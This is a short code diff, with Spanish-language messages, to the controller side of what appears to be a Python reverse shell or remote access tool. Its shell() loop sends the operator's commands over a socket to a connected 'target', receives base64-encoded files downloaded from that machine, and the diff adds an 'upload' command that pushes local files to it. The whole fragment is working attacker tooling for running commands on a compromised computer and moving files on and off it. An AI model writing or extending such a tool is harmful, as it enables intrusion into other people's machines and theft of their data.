@@ -21,8 +21,16 @@ def shell():
         elif comando[:8] == "download":
             target.send(comando)
             with open(comando[9:], 'wb') as file_download:
-                datos  = target.recv(90000000)
+                datos  = target.recv(30000)
                 file_download.write(base64.b64decode(datos))
+
+        elif comando[:6] == "upload":
+            try:
+                target.send(comando)
+                with open(comando[7:], 'rb') as file_upload:
+                    target.send(base64.b64encode(file_upload.read()))
+            except:
+                print("Ocurrio un error en la subida")   
         else:
             target.send(comando)
             res = target.recv(30000)
